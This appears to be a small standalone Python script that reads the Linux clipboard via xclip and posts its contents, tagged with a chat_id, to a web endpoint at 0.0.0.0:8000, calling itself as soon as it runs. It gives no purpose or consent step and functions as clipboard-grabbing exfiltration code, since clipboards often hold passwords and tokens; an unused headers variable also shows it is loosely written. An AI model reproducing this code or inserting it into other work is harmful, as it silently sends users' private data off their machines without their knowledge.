import requests
import subprocess

def getClipboardData():
    p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-o'], stdout=subprocess.PIPE)
    p.wait()
    data = p.stdout.read()
    headers = {
        'Content-type': 'application/json',
    }

    data = {"text": data.decode(), "chat_id": "1003945710"}
    response = requests.post('http://0.0.0.0:8000', data=data)
    return

getClipboardData()